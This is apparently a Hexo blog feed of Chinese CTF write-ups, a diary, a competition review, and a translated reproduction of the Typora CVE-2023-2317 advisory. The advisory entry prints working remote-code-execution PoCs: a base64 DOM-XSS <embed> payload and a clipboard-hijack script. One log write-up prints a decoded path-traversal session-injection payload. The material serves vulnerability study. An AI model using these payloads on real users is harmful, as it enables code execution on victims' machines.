        <content type="html"><![CDATA[<h2 id="jwt（问1"><a href="#jwt（问1" class="headerlink" title="jwt（问1)"></a>jwt（问1)</h2><p>直接看题目，一猜就是jwt哈哈哈哈</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> 流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NEWSTARCTF 第一周misc--wp</title>
      <link href="/2023/10/07/NEWSTARCTF%20%E7%AC%AC%E4%B8%80%E5%91%A8misc--wp/"/>
      <url>/2023/10/07/NEWSTARCTF%20%E7%AC%AC%E4%B8%80%E5%91%A8misc--wp/</url>
      
        <content type="html"><![CDATA[<h2 id="CyberChef’s-Secret"><a href="#CyberChef’s-Secret" class="headerlink" title="CyberChef’s Secret"></a>CyberChef’s Secret</h2><p>base套,建议用随波逐流工具梭哈</p><h2 id="机密图片"><a href="#机密图片" class="headerlink" title="机密图片"></a>机密图片</h2><p>zsteg直接梭哈<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-09-26%2014.07.20.png"></p><h2 id="流量！鲨鱼！"><a href="#流量！鲨鱼！" class="headerlink" title="流量！鲨鱼！"></a>流量！鲨鱼！</h2><p>出来的流量包大部分都是404<br>于是直接筛选200响应码的流量一个个看就行<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-09-26%2014.11.34.png"><br>得到一个base64加密后的，解密就是flag</p><h2 id="压缩包们"><a href="#压缩包们" class="headerlink" title="压缩包们"></a>压缩包们</h2><p>直接binwalk 或者foremost分离一下得到压缩包。<br>直接上爆破，我也不是很清楚为啥fcrackzip用不了<br>我最后用的是Ziperello<br><a href="https://pan.baidu.com/s/1z9b_NWOjQvGWmTRn9H5vBQ">https://pan.baidu.com/s/1z9b_NWOjQvGWmTRn9H5vBQ</a><br>密码：qyqx</p><p>后面就按照工具走就行了，密码是232311<br>就拿到flag了，如果拿到密码解出来的flag文件为空，那可能就是分离的时候有问题，换一个分离就好。</p><h2 id="空白格"><a href="#空白格" class="headerlink" title="空白格"></a>空白格</h2><p>了解snow隐写，在线网站一把嗦。<br><a href="https://vii5ard.github.io/whitespace/">https://vii5ard.github.io/whitespace/</a></p><h2 id="隐秘的眼睛"><a href="#隐秘的眼睛" class="headerlink" title="隐秘的眼睛"></a>隐秘的眼睛</h2><p>我当时也不会，直接搜 eye 隐写，出来了 <img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-09-26%2014.28.35.png">这个软件，于是直接下载一把嗦。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日记本</title>
      <link href="/2023/09/27/%E6%97%A5%E8%AE%B0%E6%9C%AC/"/>
      <url>/2023/09/27/%E6%97%A5%E8%AE%B0%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<blockquote><p>🤪本篇博客作为博主的随手记，随心而动。</p></blockquote><p>10.7<br>十月底会有我们学校和几所高校联合举办的新生赛，欢迎各位师傅参与哈。主要是校内赛，外校的师傅可以联系我们，我们会视情况发放邀请码。欢迎师傅们带学弟学妹们来参赛哈。<img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/55D3C0049B311FBACF33A8C3CEBFD915.jpg"></p><p>10.2-10.6<br>忘了记了，拼好了一个滕王阁的积木。<br>推荐看看特工任务这个电视剧，国安题材。<br>还看了西出玉门。还有很多，懒得写了。<br>开辟新地图：西青郊野公园，以后可以在哪里学钓鱼，烧烤，划船等等哈哈哈。<br>9.30-10.1<br>中午起床直接吃早午饭，下午game了几把，晚上去吃了自助烤肉，东西非常多，吃的很爽😊，多番战嗨嗨嗨。吃完看了电影坚如磐石，车撞人的情节属实是把我吓了一跳，整体来说相当好看。看完电影就去网吧通宵了doge（不能再熬了，再熬就嘎了）。今早回来直接从七点睡到了下午两点多哈哈哈哈。脑袋晕晕。今晚更新歌单，可以放音乐啦，有推荐的歌单jrm可以在评论区发出来哈。<br>9.29<br>今天出去玩了一趟，主打一个清流，我们去的精武门中华武林园，基本没人，像是包场了一样，进场之后就是自助哈哈哈哈哈哈，售票的小姐姐还问了一句，你们是咋找到这的哈哈哈哈哈哈。感觉挺适合团建去的，门票便宜，有影院，坐的地方，挺不错的。强推。整体环境啥的都非常好。<br>9.28<br>双节快乐呀！！！<br>开始摸逆向，虽然也不算真正意义上的逆向。不过要学的东西还是很多。<br>pizza吃的挺爽的，不过回来以后发现胃不太适应哈哈哈哈哈，真就是山猪🐗吃不了细糠。明天吃点汤粉缓解缓解。<br>9.27<br>把博客评论从gittalk改到valine，可以不用登陆了🤪。别干坏事🔪。<br>开辟了新地图，师范门前的小吃街真的巨好，啥都有，而且走两步就到姚村夜市了，真的巨爽😊，不知道师范收不收交换生（doge）。<br>9.26<br>完成了市赛决赛的复盘。开新坑记日记。😁<br>9.25<br>收到了小红书src寄来的两个赠品（感觉是逻辑漏洞导致的，已经上报小红书SRC），真的很好看哈哈哈，感谢🙏小红书SRC。第一次挖企业SRC，是个不错的开头😊。下午的时候接到新任务🙈，要开始忙碌了，多线程战士，启动！🥷🏻</p>]]></content>
      
      
      <categories>
          
          <category> Diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>市赛决赛赛后复盘</title>
      <link href="/2023/09/26/%E5%B8%82%E8%B5%9B%E5%86%B3%E8%B5%9B%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%9B%98/"/>
      <url>/2023/09/26/%E5%B8%82%E8%B5%9B%E5%86%B3%E8%B5%9B%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%9B%98/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这个月事情有那么亿丢丢多，时间也比较久了，难免有些失真，请大家理解。后面想起来啥再进行修改。希望对于下一次比赛有些许帮助</p></blockquote><p><strong>本次赛制采用的是</strong>：DAWD+应急响应实战赛</p><h2 id="关于DAWD"><a href="#关于DAWD" class="headerlink" title="关于DAWD:"></a>关于DAWD:</h2><p><strong>规则参考</strong>： <a href="https://datacon.qianxin.com/competition/competitions/70/introduction">https://datacon.qianxin.com/competition/competitions/70/introduction</a></p><p><strong>简单来说</strong>：每道题会给你一套源码进行代码审计，找出漏洞点进行exp与patch包的编写，然后上传裁判服务器，裁判服务器会使用你提供的exp与patch包进行攻击与防御。</p><p>同时会给你一台操作机供战队存放exp与patch包。（这里最好使用finalshell这类方便的工具）</p><h3 id="知识储备："><a href="#知识储备：" class="headerlink" title="知识储备："></a><strong>知识储备</strong>：</h3><ul><li>常见漏洞的exp编写。</li><li>常见漏洞的patch包编写。</li><li>混淆webshell的解密</li><li>快速代码审计</li><li>。。。</li></ul><h3 id="资源准备："><a href="#资源准备：" class="headerlink" title="资源准备："></a><strong>资源准备</strong>：</h3><ul><li><strong>漏洞库</strong>：这次比赛就是因为没有找到可以直接利用的漏洞点而失利，而且稳固可靠的来源会让你在多轮战当中拿下巨大的分差。</li><li><strong>常见的批量化利用脚本案例</strong>：直接套模版可以节省很大一部分编码的时间。</li><li><strong>webshell查杀工具</strong>：D盾，河马等</li><li><strong>常见漏洞的waf或者patch包</strong></li><li><strong>手速</strong></li><li>。。。</li></ul><h2 id="关于应急响应"><a href="#关于应急响应" class="headerlink" title="关于应急响应"></a>关于应急响应</h2><p><strong>内容包括相对广泛</strong>：流量分析，入侵排查，病毒分析，溯源等内容。</p><p><strong>概述</strong>：这次的比赛就直接描述了一段很长的故事，给了一个拓扑图，通过拓扑图可以通过网页连接靶机，大概有七八台靶机分布，每台靶机需要完成不同的任务，本次比赛有20个小题。</p><ul><li><strong>流量分析</strong>：因为在赛方的实训平台使用网页直接连接的靶机，还是xp系统，流量包和wireshark都在远端。。。过滤一个规则就要等个一两分钟。</li><li><strong>入侵排查</strong>：通过日志、可疑文件等寻找入侵的痕迹，找出木马、病毒、webshell等</li><li><strong>病毒分析</strong>： 根据生成的加密勒索文件找到病毒，找病毒问文件名字啥的。</li><li><strong>溯源</strong>：分析攻击服务器地址等</li></ul><h3 id="工具："><a href="#工具：" class="headerlink" title="工具："></a><strong>工具</strong>：</h3><ul><li>webshell查杀工具</li><li>火绒等查杀病毒等工具，有些环境火绒装不上，得找其他办法（我目前也不知道）</li><li>入侵痕迹检测工具和脚本。</li><li>还有的想起来再补充</li></ul><h2 id="感受与心得："><a href="#感受与心得：" class="headerlink" title="感受与心得："></a>感受与心得：</h2><ul><li><p><strong>个人建议</strong>每个队起码配备两个web手（当然不一定是web手，主要是为了分担压力，不然忙不过来）。</p></li><li><p><strong>还是太菜了，很多东西都没学过</strong>，应急响应本来想直接上传GScan脚本一键梭哈看看，但是不知道为啥，挂载硬盘一直出问题就没成功，后来也不知道因为写了啥命令导致机子直接崩溃了😭，时间也不剩多少了就直接摆烂了。</p></li><li><p><strong>分数问题</strong>：现在我也不清楚具体是怎么算分的，比赛的时候DAWD是以10000分为基准分，而应急响应来说总分就330分，所以给我一种莫名的错觉认为拿下DAWD就可以下班了。。。后来DAWD我们队第十，应急响应十几名，但是最终成绩在二十多，只拿了三等奖。赛后听到一个队反馈说DAWD第二，应急响应130多分，但是最后却没有奖（我们队200分），这么一算应急响应确实占比相当高。</p></li><li><p><strong>战术上</strong>：建议先攻后防，因为防御导致服务宕机会扣250好像，除了一些非常确定是webshell的地方，但是这次比赛第一题扫出来就是webshell，但是赛后分析发现是业务代码（幸亏当时没修）。如果人够的话建议双线程作战，应急响应一侧做完简单题就去帮帮DAWD（仅为建议）。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
            <tag> web </tag>
            
            <tag> 复盘 </tag>
            
            <tag> 流量分析 </tag>
            
            <tag> 日志分析 </tag>
            
            <tag> DAWD </tag>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客复活记</title>
      <link href="/2023/09/21/%E5%8D%9A%E5%AE%A2%E5%A4%8D%E6%B4%BB%E8%AE%B0/"/>
      <url>/2023/09/21/%E5%8D%9A%E5%AE%A2%E5%A4%8D%E6%B4%BB%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>八月底更新博客的时候突然发现hexo 部署不上去了，一直在报错，倒腾了快两天还没倒腾好，后来事情比较多，笔记啥的就都丢在本地了。。。</p><p>这个月也学到了不少，后面再更吧（挖坑势力，永不填坑）</p><p>距离上次更新博客快过去一个月了🤦‍♂️，接下来的todo：</p><ul><li>把友链界面完成</li><li>最近比赛的一些wp整理和复现</li><li>最近线下的一些心得和注意事项整理写博客</li><li>………..</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2023-2317(typora远程命令执行)复现</title>
      <link href="/2023/08/30/CVE-2023-2317(typora%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C)%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/08/30/CVE-2023-2317(typora%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C)%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="原文在这"><a href="#原文在这" class="headerlink" title="原文在这"></a><a href='https://starlabs.sg/advisories/23/23-2317/'>原文在这</a></h2><blockquote><p>以下为机翻，发布用以个人学习方便之需。<br>此漏洞在钓鱼、反制等领域都有一定意义。</p></blockquote><h2 id="产品概述："><a href="#产品概述：" class="headerlink" title="产品概述："></a>产品概述：</h2><p>Typora 是一款流行的跨平台 Markdown 编辑器，允许用户创建和编辑具有实时预览功能的 Markdown 文件。它支持各种格式选项，例如标题、粗体、斜体等。Typora 还允许用户将 Markdown 文件导出为不同的格式，例如 PDF、HTML 和 Word。</p><p>适用于 Windows&#x2F;Linux 的 Typora 基于 Electron 构建，该框架使其能够在各种操作系统上无缝运行。Markdown 编辑器支持 HTML 标签和嵌入​​外部网页。攻击者可以利用该漏洞通过在 Markdown 编辑器中加载精心设计的 URL 来执行任意 JavaScript 代码和系统命令。</p><h2 id="漏洞摘要"><a href="#漏洞摘要" class="headerlink" title="漏洞摘要:"></a>漏洞摘要:</h2><p>Windows&#x2F;Linux 版 Typora 中存在基于 DOM 的 XSS，允许任意 JavaScript 代码在 Typora 主窗口上下文中运行。如果用户在 Typora 中打开恶意 Markdown 文件，或者从恶意网页复制文本并将其粘贴到 Typora 中，则可以利用此漏洞。</p><h2 id="漏洞详细信息："><a href="#漏洞详细信息：" class="headerlink" title="漏洞详细信息："></a>漏洞详细信息：</h2><p>已在以下位置发现基于 DOM 的 XSS <code>Typora/resources/updater/updater.html</code>：</p><pre><code class="html">    &lt;div class=&quot;btn-group&quot;&gt;      &lt;div id=&quot;skip-this-version-btn-group&quot; style=&quot;flex-grow: 2; min-height: 10px;min-width: 10px;&quot;&gt;        &lt;button onClick=&quot;onSkipUpdate()&quot; data-label=&quot;1&quot; &gt;Skip This Version&lt;/button&gt;      &lt;/div&gt;            &lt;button onClick=&quot;onCancelUpdate()&quot; data-label=&quot;2&quot; &gt;Remind Me Later&lt;/button&gt;      &lt;button class=&quot;btn-primary&quot; onClick=&quot;onDownloadUpdate()&quot; data-label=&quot;3&quot; &gt;Download Update&lt;/button&gt;    &lt;/div&gt;    &lt;script type=&quot;text/javascript&quot;&gt;      // ...      var labels = JSON.parse(decodeURIComponent(/[?&amp;]labels=([^&amp;]+)/.exec(window.location.search)[1]));        // [1]      document.querySelector(&quot;#sum&quot;).innerText = labels[4] + &quot; &quot; + labels[5].replace(&quot;$1&quot;, newVersion).replace(&quot;$2&quot;, curVersion);      document.querySelectorAll(&quot;[data-label]&quot;).forEach(function(dom)&#123;        dom.innerHTML = labels[dom.getAttribute(&quot;data-label&quot;) - 0];     // [2]      &#125;);      // ...    &lt;/script&gt;</code></pre><p>在上面的代码片段中，变量<code>labels</code>是从<code>location.search</code>at中提取的<code>[1]</code>，然后分配给具有at 属性的<code>innerHTML</code>元素。<code>data-label``[2]</code></p><p>这是一个将<code>&lt;input&gt;</code>标签注入 DOM 的 PoC：</p><pre><code>updater.html?curVersion=1&amp;newVersion=2&amp;releaseNoteLink=3&amp;hideAutoUpdates=false&amp;labels=[&quot;&lt;input%20value=test&gt;&quot;,&quot;22&quot;,&quot;33&quot;,&quot;44&quot;,&quot;55&quot;,&quot;66&quot;,&quot;77&quot;]</code></pre><p><img src="https://starlabs.sg/advisories/23/images/CVE-2023-2317_01.updater-html-DOM-XSS.png"></p><p>Typora 注册了一个文件处理程序<code>typora://</code>来加载本地资源。例如，主窗口的 URL 是<code>typora://app/typemark/window.html</code>，实际文件是从 加载的<code>[Typora Installation Absolute Path]/resources/window.html</code>。</p><p>攻击者可以<code>&lt;embed&gt;</code>通过将<code>src</code>属性设置为 来将存在漏洞的 updater.html 加载到标签内<code>typora://app/typemark/updater/updater.html</code>。在这种情况下，<code>typora://app/typemark/window.html</code>在主窗口中加载的内容和嵌入的更新程序页面被视为同源。因此，更新程序能够访问暴露于主窗口的特权接口，例如<code>reqnode</code>.</p><p><img src="https://starlabs.sg/advisories/23/images/CVE-2023-2317_02.updater-and-main-window-are-same-origin.png"></p><p>通过嵌入带有精心设计的 DOM-XSS 负载的 updater.html URL，攻击者能够在主窗口上执行任意 JavaScript 代码。此外，攻击者可以使用<code>reqnode</code>主窗口中的特权界面来访问节点模块<code>child_process</code>并执行任意系统命令。</p><h2 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h2><p>可以通过诱使受害者</p><ol><li>在 Typora 中打开恶意 Markdown 文件</li><li>从恶意网页复制文本并将其粘贴到 Typora 中来利用此漏洞。</li></ol><h2 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h2><p>我们已尽力使 PoC 尽可能便携。以下 HTML 代码是演示此任意文件泄露漏洞的 PoC：</p><pre><code class="html">&lt;embed src=&quot;typora://app/typemark/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob(&#39;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ25vdGVwYWQgJVdJTkRJUiUvd2luLmluaScsIExpbnV4OiAnZ25vbWUtY2FsY3VsYXRvciAtZSAiVHlwb3JhIFJDRSBQb0MiJ30pW25hdmlnYXRvci5wbGF0Zm9ybS5zdWJzdHIoMCw1KV0p&#39;))&gt;&lt;%2fsvg&gt;%22,%22%22,%22%22,%22%22,%22%22]&quot;&gt;&lt;/embed&gt;</code></pre><p>PoC中的base64编码部分被解码为以下内容：</p><pre><code class="javascript">reqnode(&#39;child_process&#39;).exec((&#123;Win32: &#39;notepad %WINDIR%/win.ini&#39;, Linux: &#39;gnome-calculator -e &quot;Typora RCE PoC&quot;&#39;&#125;)[navigator.platform.substr(0,5)])</code></pre><p>当这个 PoC 加载到 Typora 中时，它将：</p><ol><li>使用 DOM-XSS 负载加载 updater.html</li><li>有效负载在主窗口上执行 JavaScript 代码</li><li>执行系统命令：<code>notepad</code>在Windows上，或<code>gnome-calculator</code>在Linux上</li></ol><h2 id="攻击场景："><a href="#攻击场景：" class="headerlink" title="攻击场景："></a>攻击场景：</h2><h3 id="场景一：打开恶意markdown文件"><a href="#场景一：打开恶意markdown文件" class="headerlink" title="场景一：打开恶意markdown文件"></a>场景一：打开恶意markdown文件</h3><p>攻击者可以在 Markdown 文件中注入嵌入标签，并说服受害者在 Typora 中打开它以触发有效负载。</p><p>我们附上<code>poc/typora-1.5.12-rce.md</code>这份报告以供演示。在受影响的 Typora 版本中打开文件以验证此漏洞。</p><p>以下是在 Windows 和 Ubuntu 上展示此场景的 GIF：</p><p><img src="https://starlabs.sg/advisories/23/images/CVE-2023-2317_03.open-file-on-Windows.gif"></p><p><img src="https://starlabs.sg/advisories/23/images/CVE-2023-2317_04.open-file-on-Ubuntu.gif"></p><h3 id="场景-2：从网页复制并粘贴"><a href="#场景-2：从网页复制并粘贴" class="headerlink" title="场景 2：从网页复制并粘贴"></a>场景 2：从网页复制并粘贴</h3><p><code>copy</code>攻击者可以制作恶意网页并使用以下代码来挂钩该事件：</p><pre><code class="html">&lt;script&gt;    document.addEventListener(&#39;copy&#39;,e=&gt;&#123;        e.preventDefault();        let payload = atob(&#39;JiN4M2M7ZW1iZWQgc3R5bGU9ImhlaWdodDowOyIgc3JjPSJ0eXBvcmE6Ly9hcHAvdHlwZW1hcmsvdXBkYXRlci91cGRhdGVyLmh0bWw/Y3VyVmVyc2lvbj0xMTEmbmV3VmVyc2lvbj0yMjImcmVsZWFzZU5vdGVMaW5rPTMzMyZoaWRlQXV0b1VwZGF0ZXM9ZmFsc2UmbGFiZWxzPVslMjIlMjIsJTIyJTNjc3ZnJTJmb25sb2FkPXRvcC5ldmFsKGF0b2IoJ2NtVnhibTlrWlNnblkyaHBiR1JmY0hKdlkyVnpjeWNwTG1WNFpXTW9LSHRYYVc0ek1qb2dKMjV2ZEdWd1lXUWdKVmRKVGtSSlVpVXZkMmx1TG1sdWFTY3NJRXhwYm5WNE9pQW5aMjV2YldVdFkyRnNZM1ZzWVhSdmNpQXRaU0FpVkhsd2IzSmhJRkpEUlNCUWIwTWlKMzBwVzI1aGRtbG5ZWFJ2Y2k1d2JHRjBabTl5YlM1emRXSnpkSElvTUN3MUtWMHAnKSk+PCUyZnN2Zz4lMjIsJTIyJTIyLCUyMiUyMiwlMjIlMjIsJTIyJTIyXSI+JiN4MGQ7JiN4MGQ7&#39;);        e.clipboardData.setData(&#39;text/markhtml&#39;, `\x20\x0d\x0a\x0d\x0a` + payload + window.getSelection());        console.log(payload + window.getSelection())    &#125;)&lt;/script&gt;</code></pre><p>当受害者从该页面复制文本时，有效负载会添加到复制的内容中，并在粘贴到 Typora 时触发。</p><p><img src="https://starlabs.sg/advisories/23/images/CVE-2023-2317_05.copy-paste-on-Windows.gif"></p><p><img src="https://starlabs.sg/advisories/23/images/CVE-2023-2317_06.copy-paste-on-Ubuntu.gif"></p><p>我们已附上<code>poc/rce-cp.html</code>此场景的 PoC。<a href="https://o.cal1.cn/f0a97fdef8028595-typora-poc/rce-cp.html">现场版本也可以在这里</a>找到。</p><h3 id="补充笔记："><a href="#补充笔记：" class="headerlink" title="补充笔记："></a>补充笔记：</h3><ol><li>攻击者可以在<code>&lt;embed&gt;</code>标签上设置自定义样式，以使漏洞利用变得不那么引人注目。例如，<code>height:0;</code>在场景2 PoC中用于隐藏嵌入的网页。</li></ol><h2 id="建议的缓解措施："><a href="#建议的缓解措施：" class="headerlink" title="建议的缓解措施："></a>建议的缓解措施：</h2><p>建议通过设置<code>innerText</code>而不是 来更新 HTML 元素<code>innerHTML</code>。</p><p>对于使用受此漏洞影响的版本的最终用户，建议（1）不要在 Typora 中打开任何不受信任的 Markdown 文件，（2）应避免从不受信任的网页复制文本然后将其粘贴到 Typora 中。</p><h2 id="经典复现："><a href="#经典复现：" class="headerlink" title="经典复现："></a>经典复现：</h2><p>windows改成了弹计算器版本。</p><pre><code class="html">&lt;embed src=&quot;typora://app/typemark/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob(&#39;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ==&#39;))&gt;&lt;%2fsvg&gt;%22,%22%22,%22%22,%22%22,%22%22]&quot;&gt;&lt;/embed&gt;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>陇剑杯 2021 misc 简单日志分析</title>
      <link href="/2023/08/24/%E9%99%87%E5%89%91%E6%9D%AF%202021%20misc%20%E7%AE%80%E5%8D%95%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
      <url>/2023/08/24/%E9%99%87%E5%89%91%E6%9D%AF%202021%20misc%20%E7%AE%80%E5%8D%95%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="陇剑杯-2021-简单日志分析（问1）"><a href="#陇剑杯-2021-简单日志分析（问1）" class="headerlink" title="陇剑杯 2021 简单日志分析（问1）"></a>陇剑杯 2021 简单日志分析（问1）</h2><pre><code>题目描述：某应用程序被攻击，请分析日志后作答：黑客攻击的参数是______。（如有字母请全部使用小写）。得到的flag请使用NSSCTF&#123;&#125;格式提交。</code></pre><p>既然问的是参数，而且日志中基本都是GET请求，那么我们直接搜索 <code>=</code> 看看</p><p><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2013.03.18.png"></p><p>得到user参数。</p><h2 id="陇剑杯-2021-简单日志分析（问2）"><a href="#陇剑杯-2021-简单日志分析（问2）" class="headerlink" title="陇剑杯 2021 简单日志分析（问2）"></a>陇剑杯 2021 简单日志分析（问2）</h2><pre><code>题目描述：某应用程序被攻击，请分析日志后作答：黑客查看的秘密文件的绝对路径是_____________。得到的flag请使用NSSCTF&#123;&#125;格式提交。</code></pre><p><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2013.07.21.png"><br>我们通过user参数传入的payload进行base64解密发现文件</p><blockquote><p>&#x2F;Th4s_IS_VERY_Import_Fi1e</p></blockquote><h2 id="陇剑杯-2021-简单日志分析（问3）"><a href="#陇剑杯-2021-简单日志分析（问3）" class="headerlink" title="陇剑杯 2021 简单日志分析（问3）"></a>陇剑杯 2021 简单日志分析（问3）</h2><pre><code>题目描述：某应用程序被攻击，请分析日志后作答：黑客反弹shell的ip和端口是_____________。（格式使用“ip:端口&quot;，例如127.0.0.1:2333）。得到的flag请使用NSSCTF&#123;&#125;格式提交。</code></pre><p>一样的思路，往下找还有一个payload。解密分析看看<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2013.11.08.png"><br>就可以拿到ip和端口啦。<br>tip：</p><blockquote><p>要注意先进行url解密。<br>在进行base64解密</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> 日志分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>陇剑杯 2021 misc 日志分析</title>
      <link href="/2023/08/24/%E9%99%87%E5%89%91%E6%9D%AF%202021%20misc%20%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
      <url>/2023/08/24/%E9%99%87%E5%89%91%E6%9D%AF%202021%20misc%20%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="陇剑杯-2021-日志分析（问1）"><a href="#陇剑杯-2021-日志分析（问1）" class="headerlink" title="陇剑杯 2021 日志分析（问1）"></a>陇剑杯 2021 日志分析（问1）</h2><pre><code>题目描述：单位某应用程序被攻击，请分析日志，进行作答：网络存在源码泄漏，源码文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)。得到的flag请使用NSSCTF&#123;&#125;格式提交。</code></pre><p>打开日志文件，不知道用哪个软件比较好分析，还请各位大佬指点。<br>我直接用vscode打开看看<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2012.39.08.png"><br>发现主要信息集中于请求路径和状态码。<br>大部分都是404，直接全局搜索200看看</p><p>大概下半段就可以看到请求<a href="http://www.zip时为200/">www.zip时为200</a>.<br>下班！</p><h2 id="陇剑杯-2021-日志分析（问2）"><a href="#陇剑杯-2021-日志分析（问2）" class="headerlink" title="陇剑杯 2021 日志分析（问2）"></a>陇剑杯 2021 日志分析（问2）</h2><pre><code>题目描述：单位某应用程序被攻击，请分析日志，进行作答：分析攻击流量，黑客往/tmp目录写入一个文件，文件名为_____________。得到的flag请使用NSSCTF&#123;&#125;格式提交。</code></pre><p><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2012.46.43.png"><br>全局搜索一下tmp，发现有<br><code>/?filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fsess_car&amp;content=func%7CN%3Bfiles%7Ca%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A16%3A%22.%2Ffiles%2Ffilename%22%3Bs%3A20%3A%22call_user_func_array%22%3Bs%3A28%3A%22.%2Ffiles%2Fcall_user_func_array%22%3B%7Dpaths%7Ca%3A1%3A%7Bs%3A5%3A%22%2Fflag%22%3Bs%3A13%3A%22SplFileObject%22%3B%7D</code><br>解一下码好看一点。<br><code>/?filename=../../../../../../../../../../../../../../../../../tmp/sess_car&amp;content=func|N;files|a:2:&#123;s:8:&quot;filename&quot;;s:16:&quot;./files/filename&quot;;s:20:&quot;call_user_func_array&quot;;s:28:&quot;./files/call_user_func_array&quot;;&#125;paths|a:1:&#123;s:5:&quot;/flag&quot;;s:13:&quot;SplFileObject&quot;;&#125;</code></p><p>得到sess_car.</p><h2 id="陇剑杯-2021-日志分析（问3）"><a href="#陇剑杯-2021-日志分析（问3）" class="headerlink" title="陇剑杯 2021 日志分析（问3）"></a>陇剑杯 2021 日志分析（问3）</h2><pre><code>题目描述：单位某应用程序被攻击，请分析日志，进行作答：分析攻击流量，黑客使用的是______类读取了秘密文件。得到的flag请使用NSSCTF&#123;&#125;格式提交。</code></pre><p>上一题中解码出来的payload就能看出时SplFileObject类进行读取。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> 日志分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>陇剑杯 2021 misc webshell</title>
      <link href="/2023/08/23/%E9%99%87%E5%89%91%E6%9D%AF%202021%20misc%20webshell/"/>
      <url>/2023/08/23/%E9%99%87%E5%89%91%E6%9D%AF%202021%20misc%20webshell/</url>
      
